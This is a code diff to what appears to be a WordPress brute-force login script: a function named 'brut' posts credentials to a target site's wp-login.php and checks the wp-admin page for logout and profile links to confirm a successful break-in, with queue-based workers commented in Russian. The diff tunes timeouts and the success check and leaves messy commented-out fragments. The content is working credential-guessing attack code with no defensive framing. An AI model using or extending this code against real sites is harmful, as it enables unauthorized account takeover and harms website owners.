@@ -30,16 +30,24 @@ def brut(string):
     url = 'http://'+t[2]+'/wp-login.php'
     s = requests.Session()
     try:    
-        s.post(url, data=payload, headers=headers, timeout = 30)
+        s.post(url, data=payload, headers=headers, timeout = 10)
     except Exception:
         print('ERROR')
         return False
-    response = s.get('http://'+t[2]+'/wp-admin', headers=headers, timeout = 30)
-    if response.text.find('action=logout') and response.text.find('profile.php')  >0:
-        return True
-    else:
+#---------------------------------------------------------------------------------------
+    '''if s.text.find('action=lostpassword')>0:action=logout
         return False
-
+    else:'''
+    response = s.get('http://'+t[2]+'/wp-admin', headers=headers, timeout = 10)
+    #if response.status_code == 200:
+    if response.text.find('action=logout')>0 and response.text.find('profile.php')>0:
+    #if response.text.find('action=lostpassword')<0:
+        return True
+    #else:
+        #return False
+    #else:
+        #return False
+#action=lostpassword
 def run(queue, result_queue):
     # Цикл продолжается пока очередь задач не станет пустой
     while not queue.empty():
